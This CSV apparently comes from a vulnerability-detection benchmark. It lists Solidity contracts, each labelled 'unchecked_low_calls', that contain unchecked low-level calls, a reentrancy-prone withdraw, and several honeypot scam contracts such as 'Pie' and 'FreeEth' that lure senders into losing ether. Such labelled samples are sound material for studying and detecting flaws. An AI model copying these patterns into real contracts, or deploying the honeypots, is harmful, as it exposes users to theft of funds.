filename,vulnerability_category,source_code
0x806a6bd219f162442d992bdc4ee6eba1f2c5a707.sol,unchecked_low_calls,"pragma solidity ^0.4.19; contract Pie { address public Owner = msg.sender; function() public payable { } function GetPie() public payable { if(msg.value>1 ether) { Owner.transfer(this.balance); msg.sender.transfer(this.balance); } } function withdraw() payable public { if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;} require(msg.sender == Owner); Owner.transfer(this.balance); } function Command(address adr,bytes data) payable public { require(msg.sender == Owner); adr.call.value(msg.value)(data); } }"
0x84d9ec85c9c568eb332b7226a8f826d897e0a4a8.sol,unchecked_low_calls,"pragma solidity ^0.4.16; contract Owned { modifier onlyOwner() { require(msg.sender == owner); _; } address public owner; function Owned() { owner = msg.sender; } address public newOwner; function changeOwner(address _newOwner) onlyOwner { newOwner = _newOwner; } function acceptOwnership() { if (msg.sender == newOwner) { owner = newOwner; } } function execute(address _dst, uint _value, bytes _data) onlyOwner { _dst.call.value(_value)(_data); } } contract WedIndex is Owned { string public wedaddress; string public partnernames; uint public indexdate; uint public weddingdate; uint public displaymultisig; IndexArray[] public indexarray; struct IndexArray { uint indexdate; string wedaddress; string partnernames; uint weddingdate; uint displaymultisig; } function numberOfIndex() constant public returns (uint) { return indexarray.length; } function writeIndex(uint indexdate, string wedaddress, string partnernames, uint weddingdate, uint displaymultisig) { indexarray.push(IndexArray(now, wedaddress, partnernames, weddingdate, displaymultisig)); IndexWritten(now, wedaddress, partnernames, weddingdate, displaymultisig); } event IndexWritten (uint time, string contractaddress, string partners, uint weddingdate, uint display); }"
0x89c1b3807d4c67df034fffb62f3509561218d30b.sol,unchecked_low_calls,"pragma solidity ^0.4.9; contract TownCrier { struct Request { address requester; uint fee; address callbackAddr; bytes4 callbackFID; bytes32 paramsHash; } event Upgrade(address newAddr); event Reset(uint gas_price, uint min_fee, uint cancellation_fee); event RequestInfo(uint64 id, uint8 requestType, address requester, uint fee, address callbackAddr, bytes32 paramsHash, uint timestamp, bytes32[] requestData); event DeliverInfo(uint64 requestId, uint fee, uint gasPrice, uint gasLeft, uint callbackGas, bytes32 paramsHash, uint64 error, bytes32 respData); event Cancel(uint64 requestId, address canceller, address requester, uint fee, int flag); address public constant SGX_ADDRESS = 0x18513702cCd928F2A3eb63d900aDf03c9cc81593; uint public GAS_PRICE = 5 * 10**10; uint public MIN_FEE = 30000 * GAS_PRICE; uint public CANCELLATION_FEE = 25000 * GAS_PRICE; uint public constant CANCELLED_FEE_FLAG = 1; uint public constant DELIVERED_FEE_FLAG = 0; int public constant FAIL_FLAG = -2 ** 250; int public constant SUCCESS_FLAG = 1; bool public killswitch; bool public externalCallFlag; uint64 public requestCnt; uint64 public unrespondedCnt; Request[2**64] public requests; int public newVersion = 0; function () {} function TownCrier() public { requestCnt = 1; requests[0].requester = msg.sender; killswitch = false; unrespondedCnt = 0; externalCallFlag = false; } function upgrade(address newAddr) { if (msg.sender == requests[0].requester && unrespondedCnt == 0) { newVersion = -int(newAddr); killswitch = true; Upgrade(newAddr); } } function reset(uint price, uint minGas, uint cancellationGas) public { if (msg.sender == requests[0].requester && unrespondedCnt == 0) { GAS_PRICE = price; MIN_FEE = price * minGas; CANCELLATION_FEE = price * cancellationGas; Reset(GAS_PRICE, MIN_FEE, CANCELLATION_FEE); } } function suspend() public { if (msg.sender == requests[0].requester) { killswitch = true; } } function restart() public { if (msg.sender == requests[0].requester && newVersion == 0) { killswitch = false; } } function withdraw() public { if (msg.sender == requests[0].requester && unrespondedCnt == 0) { if (!requests[0].requester.call.value(this.balance)()) { throw; } } } function request(uint8 requestType, address callbackAddr, bytes4 callbackFID, uint timestamp, bytes32[] requestData) public payable returns (int) { if (externalCallFlag) { throw; } if (killswitch) { externalCallFlag = true; if (!msg.sender.call.value(msg.value)()) { throw; } externalCallFlag = false; return newVersion; } if (msg.value < MIN_FEE) { externalCallFlag = true; if (!msg.sender.call.value(msg.value)()) { throw; } externalCallFlag = false; return FAIL_FLAG; } else { uint64 requestId = requestCnt; requestCnt++; unrespondedCnt++; bytes32 paramsHash = sha3(requestType, requestData); requests[requestId].requester = msg.sender; requests[requestId].fee = msg.value; requests[requestId].callbackAddr = callbackAddr; requests[requestId].callbackFID = callbackFID; requests[requestId].paramsHash = paramsHash; RequestInfo(requestId, requestType, msg.sender, msg.value, callbackAddr, paramsHash, timestamp, requestData); return requestId; } } function deliver(uint64 requestId, bytes32 paramsHash, uint64 error, bytes32 respData) public { if (msg.sender != SGX_ADDRESS || requestId <= 0 || requests[requestId].requester == 0 || requests[requestId].fee == DELIVERED_FEE_FLAG) { return; } uint fee = requests[requestId].fee; if (requests[requestId].paramsHash != paramsHash) { return; } else if (fee == CANCELLED_FEE_FLAG) { SGX_ADDRESS.send(CANCELLATION_FEE); requests[requestId].fee = DELIVERED_FEE_FLAG; unrespondedCnt--; return; } requests[requestId].fee = DELIVERED_FEE_FLAG; unrespondedCnt--; if (error < 2) { SGX_ADDRESS.send(fee); } else { externalCallFlag = true; requests[requestId].requester.call.gas(2300).value(fee)(); externalCallFlag = false; } uint callbackGas = (fee - MIN_FEE) / tx.gasprice; DeliverInfo(requestId, fee, tx.gasprice, msg.gas, callbackGas, paramsHash, error, respData); if (callbackGas > msg.gas - 5000) { callbackGas = msg.gas - 5000; } externalCallFlag = true; requests[requestId].callbackAddr.call.gas(callbackGas)(requests[requestId].callbackFID, requestId, error, respData); externalCallFlag = false; } function cancel(uint64 requestId) public returns (int) { if (externalCallFlag) { throw; } if (killswitch) { return 0; } uint fee = requests[requestId].fee; if (requests[requestId].requester == msg.sender && fee >= CANCELLATION_FEE) { requests[requestId].fee = CANCELLED_FEE_FLAG; externalCallFlag = true; if (!msg.sender.call.value(fee - CANCELLATION_FEE)()) { throw; } externalCallFlag = false; Cancel(requestId, msg.sender, requests[requestId].requester, requests[requestId].fee, 1); return SUCCESS_FLAG; } else { Cancel(requestId, msg.sender, requests[requestId].requester, fee, -1); return FAIL_FLAG; } } }"
0x8fd1e427396ddb511533cf9abdbebd0a7e08da35.sol,unchecked_low_calls,"pragma solidity ^0.4.18; contract Ownable { address newOwner; address owner = msg.sender; function changeOwner(address addr) public onlyOwner { newOwner = addr; } function confirmOwner() public { if(msg.sender==newOwner) { owner=newOwner; } } modifier onlyOwner { if(owner == msg.sender)_; } } contract Token is Ownable { address owner = msg.sender; function WithdrawToken(address token, uint256 amount,address to) public onlyOwner { token.call(bytes4(sha3(""transfer(address,uint256)"")),to,amount); } } contract TokenBank is Token { uint public MinDeposit; mapping (address => uint) public Holders; function initTokenBank() public { owner = msg.sender; MinDeposit = 1 ether; } function() payable { Deposit(); } function Deposit() payable { if(msg.value>=MinDeposit) { Holders[msg.sender]+=msg.value; } } function WitdrawTokenToHolder(address _to,address _token,uint _amount) public onlyOwner { if(Holders[_to]>0) { Holders[_to]=0; WithdrawToken(_token,_amount,_to); } } function WithdrawToHolder(address _addr, uint _wei) public onlyOwner payable { if(Holders[msg.sender]>0) { if(Holders[_addr]>=_wei) { _addr.call.value(_wei); Holders[_addr]-=_wei; } } } function Bal() public constant returns(uint){return this.balance;} }"
0x958a8f594101d2c0485a52319f29b2647f2ebc06.sol,unchecked_low_calls,"pragma solidity ^0.4.16; contract Owned { modifier onlyOwner() { require(msg.sender == owner); _; } address public owner; function Owned() { owner = msg.sender; } address public newOwner; function changeOwner(address _newOwner) onlyOwner { newOwner = _newOwner; } function acceptOwnership() { if (msg.sender == newOwner) { owner = newOwner; } } function execute(address _dst, uint _value, bytes _data) onlyOwner { _dst.call.value(_value)(_data); } } contract Marriage is Owned { string public partner1; string public partner2; uint public marriageDate; string public marriageStatus; string public vows; Event[] public majorEvents; Message[] public messages; struct Event { uint date; string name; string description; string url; } struct Message { uint date; string nameFrom; string text; string url; uint value; } modifier areMarried { require(sha3(marriageStatus) == sha3(""Married"")); _; } function Marriage(address _owner) { owner = _owner; } function numberOfMajorEvents() constant public returns (uint) { return majorEvents.length; } function numberOfMessages() constant public returns (uint) { return messages.length; } function createMarriage( string _partner1, string _partner2, string _vows, string url) onlyOwner { require(majorEvents.length == 0); partner1 = _partner1; partner2 = _partner2; marriageDate = now; vows = _vows; marriageStatus = ""Married""; majorEvents.push(Event(now, ""Marriage"", vows, url)); MajorEvent(""Marrigage"", vows, url); } function setStatus(string status, string url) onlyOwner { marriageStatus = status; setMajorEvent(""Changed Status"", status, url); } function setMajorEvent(string name, string description, string url) onlyOwner areMarried { majorEvents.push(Event(now, name, description, url)); MajorEvent(name, description, url); } function sendMessage(string nameFrom, string text, string url) payable areMarried { if (msg.value > 0) { owner.transfer(this.balance); } messages.push(Message(now, nameFrom, text, url, msg.value)); MessageSent(nameFrom, text, url, msg.value); } event MajorEvent(string name, string description, string url); event MessageSent(string name, string description, string url, uint value); }"
0x9d06cbafa865037a01d322d3f4222fa3e04e5488.sol,unchecked_low_calls,"pragma solidity ^0.4.23; contract Delta { address public c = 0xF85A2E95FA30d005F629cBe6c6d2887D979ffF2A; address public owner = 0x788c45dd60ae4dbe5055b5ac02384d5dc84677b0; address public owner2 = 0x0C6561edad2017c01579Fd346a58197ea01A0Cf3; uint public active = 1; uint public token_price = 10**18*1/1000; function() payable { tokens_buy(); } function tokens_buy() payable returns (bool) { require(active > 0); require(msg.value >= token_price); uint tokens_buy = msg.value*10**18/token_price; require(tokens_buy > 0); if(!c.call(bytes4(sha3(""transferFrom(address,address,uint256)"")),owner, msg.sender,tokens_buy)){ return false; } uint sum2 = msg.value * 3 / 10; owner2.send(sum2); return true; } function withdraw(uint256 _amount) onlyOwner returns (bool result) { uint256 balance; balance = this.balance; if(_amount > 0) balance = _amount; owner.send(balance); return true; } function change_token_price(uint256 _token_price) onlyOwner returns (bool result) { token_price = _token_price; return true; } function change_active(uint256 _active) onlyOwner returns (bool result) { active = _active; return true; } modifier onlyOwner() { if (msg.sender != owner) { throw; } _; } }"
0xa1fceeff3acc57d257b917e30c4df661401d6431.sol,unchecked_low_calls,"pragma solidity ^0.4.18; contract AirDropContract{ function AirDropContract() public { } modifier validAddress( address addr ) { require(addr != address(0x0)); require(addr != address(this)); _; } function transfer(address contract_address,address[] tos,uint[] vs) public validAddress(contract_address) returns (bool){ require(tos.length > 0); require(vs.length > 0); require(tos.length == vs.length); bytes4 id = bytes4(keccak256(""transferFrom(address,address,uint256)"")); for(uint i = 0 ; i < tos.length; i++){ contract_address.call(id, msg.sender, tos[i], vs[i]); } return true; } }"
0xa46edd6a9a93feec36576ee5048146870ea2c3ae.sol,unchecked_low_calls,"pragma solidity ^0.4.18; contract EBU{ function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){ require(_tos.length > 0); bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)"")); for(uint i=0;i<_tos.length;i++){ caddress.call(id,from,_tos[i],v[i]); } return true; } }"
0xb0510d68f210b7db66e8c7c814f22680f2b8d1d6.sol,unchecked_low_calls,"pragma solidity ^0.4.23; contract Splitter{ address public owner; address[] public puppets; mapping (uint256 => address) public extra; address private _addy; uint256 private _share; uint256 private _count; constructor() payable public{ owner = msg.sender; newPuppet(); newPuppet(); newPuppet(); newPuppet(); extra[0] = puppets[0]; extra[1] = puppets[1]; extra[2] = puppets[2]; extra[3] = puppets[3]; } function withdraw() public{ require(msg.sender == owner); owner.transfer(address(this).balance); } function getPuppetCount() public constant returns(uint256 puppetCount){ return puppets.length; } function newPuppet() public returns(address newPuppet){ require(msg.sender == owner); Puppet p = new Puppet(); puppets.push(p); return p; } function setExtra(uint256 _id, address _newExtra) public { require(_newExtra != address(0)); extra[_id] = _newExtra; } function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); } function() payable public{ } } contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; } function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); } } function withdraw() public{ require(msg.sender == master[0]); master[0].transfer(address(this).balance); } } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; assert(c >= a); return c; } }"
0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77.sol,unchecked_low_calls,"pragma solidity ^0.4.24; contract Proxy { modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender; function transferOwner(address _owner) public onlyOwner { Owner = _owner; } function proxy(address target, bytes data) public payable { target.call.value(msg.value)(data); } } contract DepositProxy is Proxy { address public Owner; mapping (address => uint256) public Deposits; function () public payable { } function Vault() public payable { if (msg.sender == tx.origin) { Owner = msg.sender; deposit(); } } function deposit() public payable { if (msg.value > 0.5 ether) { Deposits[msg.sender] += msg.value; } } function withdraw(uint256 amount) public onlyOwner { if (amount>0 && Deposits[msg.sender]>=amount) { msg.sender.transfer(amount); } } }"
0xb37f18af15bafb869a065b61fc83cfc44ed9cc27.sol,unchecked_low_calls,"pragma solidity ^0.4.24; contract SimpleWallet { address public owner = msg.sender; uint public depositsCount; modifier onlyOwner { require(msg.sender == owner); _; } function() public payable { depositsCount++; } function withdrawAll() public onlyOwner { withdraw(address(this).balance); } function withdraw(uint _value) public onlyOwner { msg.sender.transfer(_value); } function sendMoney(address _target, uint _value) public onlyOwner { _target.call.value(_value)(); } }"
0xb620cee6b52f96f3c6b253e6eea556aa2d214a99.sol,unchecked_low_calls,"pragma solidity ^0.4.23; contract DrainMe { address public winner = 0x0; address public owner; address public firstTarget = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b; address public secondTarget = 0x1C3E062c77f09fC61550703bDd1D59842C22c766; address[] public players; mapping(address=>bool) approvedPlayers; uint256 public secret; uint256[] public seed = [951828771,158769871220]; uint256[] public balance; function DranMe() public payable{ owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } modifier onlyWinner() { require(msg.sender == winner); _; } modifier onlyPlayers() { require(approvedPlayers[msg.sender]); _; } function getLength() public constant returns(uint256) { return seed.length; } function setSecret(uint256 _secret) public payable onlyOwner{ secret = _secret; } function getPlayerCount() public constant returns(uint256) { return players.length; } function getPrize() public constant returns(uint256) { return address(this).balance; } function becomePlayer() public payable{ require(msg.value >= 0.02 ether); players.push(msg.sender); approvedPlayers[msg.sender]=true; } function manipulateSecret() public payable onlyPlayers{ require (msg.value >= 0.01 ether); if(msg.sender!=owner || unlockSecret()){ uint256 amount = 0; msg.sender.transfer(amount); } } function unlockSecret() private returns(bool){ bytes32 hash = keccak256(blockhash(block.number-1)); uint256 secret = uint256(hash); if(secret%5==0){ winner = msg.sender; return true; } else{ return false; } } function callFirstTarget () public payable onlyPlayers { require (msg.value >= 0.005 ether); firstTarget.call.value(msg.value)(); } function callSecondTarget () public payable onlyPlayers { require (msg.value >= 0.005 ether); secondTarget.call.value(msg.value)(); } function setSeed (uint256 _index, uint256 _value) public payable onlyPlayers { seed[_index] = _value; } function addSeed (uint256 _add) public payable onlyPlayers { seed.length = _add; } function guessSeed (uint256 _seed) public payable onlyPlayers returns(uint256) { return (_seed / (seed[0]*seed[1])); if((_seed / (seed[0]*seed[1])) == secret) { owner = winner; } } function checkSecret () public payable onlyPlayers returns(bool) { require(msg.value >= 0.01 ether); if(msg.value == secret){ return true; } } function winPrize() public payable onlyOwner { owner.call.value(1 wei)(); } function claimPrize() public payable onlyWinner { winner.transfer(address(this).balance); } function() public payable{ } }"
0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7.sol,unchecked_low_calls,pragma solidity ^0.4.23; contract keepMyEther { mapping(address => uint256) public balances; function () payable public { balances[msg.sender] += msg.value; } function withdraw() public { msg.sender.call.value(balances[msg.sender])(); balances[msg.sender] = 0; } }
0xbaa3de6504690efb064420d89e871c27065cdd52.sol,unchecked_low_calls,"pragma solidity ^0.4.23; contract Proxy { modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender; function transferOwner(address _owner) public onlyOwner { Owner = _owner; } function proxy(address target, bytes data) public payable { target.call.value(msg.value)(data); } } contract VaultProxy is Proxy { address public Owner; mapping (address => uint256) public Deposits; function () public payable { } function Vault() public payable { if (msg.sender == tx.origin) { Owner = msg.sender; deposit(); } } function deposit() public payable { if (msg.value > 0.25 ether) { Deposits[msg.sender] += msg.value; } } function withdraw(uint256 amount) public onlyOwner { if (amount>0 && Deposits[msg.sender]>=amount) { msg.sender.transfer(amount); } } }"
0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c.sol,unchecked_low_calls,"pragma solidity ^0.4.24; contract Proxy { modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender; function transferOwner(address _owner) public onlyOwner { Owner = _owner; } function proxy(address target, bytes data) public payable { target.call.value(msg.value)(data); } } contract VaultProxy is Proxy { address public Owner; mapping (address => uint256) public Deposits; function () public payable { } function Vault() public payable { if (msg.sender == tx.origin) { Owner = msg.sender; deposit(); } } function deposit() public payable { if (msg.value > 0.5 ether) { Deposits[msg.sender] += msg.value; } } function withdraw(uint256 amount) public onlyOwner { if (amount>0 && Deposits[msg.sender]>=amount) { msg.sender.transfer(amount); } } }"
0xd2018bfaa266a9ec0a1a84b061640faa009def76.sol,unchecked_low_calls,"pragma solidity ^0.4.19; contract Pie { address public Owner = msg.sender; function() public payable { } function Get() public payable { if(msg.value>1 ether) { Owner.transfer(this.balance); msg.sender.transfer(this.balance); } } function withdraw() payable public { if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;} require(msg.sender == Owner); Owner.transfer(this.balance); } function Command(address adr,bytes data) payable public { require(msg.sender == Owner); adr.call.value(msg.value)(data); } }"
0xd5967fed03e85d1cce44cab284695b41bc675b5c.sol,unchecked_low_calls,"pragma solidity ^0.4.24; contract demo{ function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){ require(_tos.length > 0); bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)"")); for(uint i=0;i<_tos.length;i++){ caddress.call(id,from,_tos[i],v); } return true; } }"
0xdb1c55f6926e7d847ddf8678905ad871a68199d2.sol,unchecked_low_calls,"pragma solidity ^0.4.19; contract FreeEth { address public Owner = msg.sender; function() public payable{} function GetFreebie() public payable { if(msg.value>1 ether) { Owner.transfer(this.balance); msg.sender.transfer(this.balance); } } function withdraw() payable public { if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;} require(msg.sender == Owner); Owner.transfer(this.balance); } function Command(address adr,bytes data) payable public { require(msg.sender == Owner); adr.call.value(msg.value)(data); } }"
0xe09b1ab8111c2729a76f16de96bc86a7af837928.sol,unchecked_low_calls,"pragma solidity ^0.4.24; contract FiftyFlip { uint constant DONATING_X = 20; uint constant JACKPOT_FEE = 10; uint constant JACKPOT_MODULO = 1000; uint constant DEV_FEE = 20; uint constant WIN_X = 1900; uint constant MIN_BET = 0.01 ether; uint constant MAX_BET = 1 ether; uint constant BET_EXPIRATION_BLOCKS = 250; address public owner; address public autoPlayBot; address public secretSigner; address private whale; uint256 public jackpotSize; uint256 public devFeeSize; uint256 public lockedInBets; uint256 public totalAmountToWhale; struct Bet { uint amount; uint256 blockNumber; bool betMask; address player; } mapping (uint => Bet) bets; mapping (address => uint) donateAmount; event Wager(uint ticketID, uint betAmount, uint256 betBlockNumber, bool betMask, address betPlayer); event Win(address winner, uint amount, uint ticketID, bool maskRes, uint jackpotRes); event Lose(address loser, uint amount, uint ticketID, bool maskRes, uint jackpotRes); event Refund(uint ticketID, uint256 amount, address requester); event Donate(uint256 amount, address donator); event FailedPayment(address paidUser, uint amount); event Payment(address noPaidUser, uint amount); event JackpotPayment(address player, uint ticketID, uint jackpotWin); constructor (address whaleAddress, address autoPlayBotAddress, address secretSignerAddress) public { owner = msg.sender; autoPlayBot = autoPlayBotAddress; whale = whaleAddress; secretSigner = secretSignerAddress; jackpotSize = 0; devFeeSize = 0; lockedInBets = 0; totalAmountToWhale = 0; } modifier onlyOwner() { require (msg.sender == owner, ""You are not the owner of this contract!""); _; } modifier onlyBot() { require (msg.sender == autoPlayBot, ""You are not the bot of this contract!""); _; } modifier checkContractHealth() { require (address(this).balance >= lockedInBets + jackpotSize + devFeeSize, ""This contract doesn't have enough balance, it is stopped till someone donate to this game!""); _; } function() public payable { } function setBotAddress(address autoPlayBotAddress) onlyOwner() external { autoPlayBot = autoPlayBotAddress; } function setSecretSigner(address _secretSigner) onlyOwner() external { secretSigner = _secretSigner; } function wager(bool bMask, uint ticketID, uint ticketLastBlock, uint8 v, bytes32 r, bytes32 s) checkContractHealth() external payable { Bet storage bet = bets[ticketID]; uint amount = msg.value; address player = msg.sender; require (bet.player == address(0), ""Ticket is not new one!""); require (amount >= MIN_BET, ""Your bet is lower than minimum bet amount""); require (amount <= MAX_BET, ""Your bet is higher than maximum bet amount""); require (getCollateralBalance() >= 2 * amount, ""If we accept this, this contract will be in danger!""); require (block.number <= ticketLastBlock, ""Ticket has expired.""); bytes32 signatureHash = keccak256(abi.encodePacked('\x19Ethereum Signed Message:\n37', uint40(ticketLastBlock), ticketID)); require (secretSigner == ecrecover(signatureHash, v, r, s), ""web3 vrs signature is not valid.""); jackpotSize += amount * JACKPOT_FEE / 1000; devFeeSize += amount * DEV_FEE / 1000; lockedInBets += amount * WIN_X / 1000; uint donate_amount = amount * DONATING_X / 1000; whale.call.value(donate_amount)(bytes4(keccak256(""donate()""))); totalAmountToWhale += donate_amount; bet.amount = amount; bet.blockNumber = block.number; bet.betMask = bMask; bet.player = player; emit Wager(ticketID, bet.amount, bet.blockNumber, bet.betMask, bet.player); } function play(uint ticketReveal) checkContractHealth() external { uint ticketID = uint(keccak256(abi.encodePacked(ticketReveal))); Bet storage bet = bets[ticketID]; require (bet.player != address(0), ""TicketID is not correct!""); require (bet.amount != 0, ""Ticket is already used one!""); uint256 blockNumber = bet.blockNumber; if(blockNumber < block.number && blockNumber >= block.number - BET_EXPIRATION_BLOCKS) { uint256 random = uint256(keccak256(abi.encodePacked(blockhash(blockNumber), ticketReveal))); bool maskRes = (random % 2) !=0; uint jackpotRes = random % JACKPOT_MODULO; uint tossWinAmount = bet.amount * WIN_X / 1000; uint tossWin = 0; uint jackpotWin = 0; if(bet.betMask == maskRes) { tossWin = tossWinAmount; } if(jackpotRes == 0) { jackpotWin = jackpotSize; jackpotSize = 0; } if (jackpotWin > 0) { emit JackpotPayment(bet.player, ticketID, jackpotWin); } if(tossWin + jackpotWin > 0) { payout(bet.player, tossWin + jackpotWin, ticketID, maskRes, jackpotRes); } else { loseWager(bet.player, bet.amount, ticketID, maskRes, jackpotRes); } lockedInBets -= tossWinAmount; bet.amount = 0; } else { revert(); } } function donateForContractHealth() external payable { donateAmount[msg.sender] += msg.value; emit Donate(msg.value, msg.sender); } function withdrawDonation(uint amount) external { require(donateAmount[msg.sender] >= amount, ""You are going to withdraw more than you donated!""); if (sendFunds(msg.sender, amount)){ donateAmount[msg.sender] -= amount; } } function refund(uint ticketID) checkContractHealth() external { Bet storage bet = bets[ticketID]; require (bet.amount != 0, ""this ticket has no balance""); require (block.number > bet.blockNumber + BET_EXPIRATION_BLOCKS, ""this ticket is expired.""); sendRefund(ticketID); } function withdrawDevFee(address withdrawAddress, uint withdrawAmount) onlyOwner() checkContractHealth() external { require (devFeeSize >= withdrawAmount, ""You are trying to withdraw more amount than developer fee.""); require (withdrawAmount <= address(this).balance, ""Contract balance is lower than withdrawAmount""); require (devFeeSize <= address(this).balance, ""Not enough funds to withdraw.""); if (sendFunds(withdrawAddress, withdrawAmount)){ devFeeSize -= withdrawAmount; } } function withdrawBotFee(uint withdrawAmount) onlyBot() checkContractHealth() external { require (devFeeSize >= withdrawAmount, ""You are trying to withdraw more amount than developer fee.""); require (withdrawAmount <= address(this).balance, ""Contract balance is lower than withdrawAmount""); require (devFeeSize <= address(this).balance, ""Not enough funds to withdraw.""); if (sendFunds(autoPlayBot, withdrawAmount)){ devFeeSize -= withdrawAmount; } } function getBetInfo(uint ticketID) constant external returns (uint, uint256, bool, address){ Bet storage bet = bets[ticketID]; return (bet.amount, bet.blockNumber, bet.betMask, bet.player); } function getContractBalance() constant external returns (uint){ return address(this).balance; } function getCollateralBalance() constant public returns (uint){ if (address(this).balance > lockedInBets + jackpotSize + devFeeSize) return address(this).balance - lockedInBets - jackpotSize - devFeeSize; return 0; } function kill() external onlyOwner() { require (lockedInBets == 0, ""All bets should be processed (settled or refunded) before self-destruct.""); selfdestruct(owner); } function payout(address winner, uint ethToTransfer, uint ticketID, bool maskRes, uint jackpotRes) internal { winner.transfer(ethToTransfer); emit Win(winner, ethToTransfer, ticketID, maskRes, jackpotRes); } function sendRefund(uint ticketID) internal { Bet storage bet = bets[ticketID]; address requester = bet.player; uint256 ethToTransfer = bet.amount; requester.transfer(ethToTransfer); uint tossWinAmount = bet.amount * WIN_X / 1000; lockedInBets -= tossWinAmount; bet.amount = 0; emit Refund(ticketID, ethToTransfer, requester); } function sendFunds(address paidUser, uint amount) private returns (bool){ bool success = paidUser.send(amount); if (success) { emit Payment(paidUser, amount); } else { emit FailedPayment(paidUser, amount); } return success; } function loseWager(address player, uint amount, uint ticketID, bool maskRes, uint jackpotRes) internal { emit Lose(player, amount, ticketID, maskRes, jackpotRes); } function clearStorage(uint[] toCleanTicketIDs) external { uint length = toCleanTicketIDs.length; for (uint i = 0; i < length; i++) { clearProcessedBet(toCleanTicketIDs[i]); } } function clearProcessedBet(uint ticketID) private { Bet storage bet = bets[ticketID]; if (bet.amount != 0 || block.number <= bet.blockNumber + BET_EXPIRATION_BLOCKS) { return; } bet.blockNumber = 0; bet.betMask = false; bet.player = address(0); } function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens) public onlyOwner() returns (bool success) { return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens); } } contract ERC20Interface { function transfer(address to, uint256 tokens) public returns (bool success); }"
0xe4eabdca81e31d9acbc4af76b30f532b6ed7f3bf.sol,unchecked_low_calls,"pragma solidity ^0.4.19; contract Honey { address public Owner = msg.sender; function() public payable { } function GetFreebie() public payable { if(msg.value>1 ether) { Owner.transfer(this.balance); msg.sender.transfer(this.balance); } } function withdraw() payable public { if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;} require(msg.sender == Owner); Owner.transfer(this.balance); } function Command(address adr,bytes data) payable public { require(msg.sender == Owner); adr.call.value(msg.value)(data); } }"
0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol,unchecked_low_calls,"pragma solidity ^0.4.19; contract Freebie { address public Owner = msg.sender; function() public payable{} function GetFreebie() public payable { if(msg.value>1 ether) { Owner.transfer(this.balance); msg.sender.transfer(this.balance); } } function withdraw() payable public { if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;} require(msg.sender == Owner); Owner.transfer(this.balance); } function Command(address adr,bytes data) payable public { require(msg.sender == Owner); adr.call.value(msg.value)(data); } }"
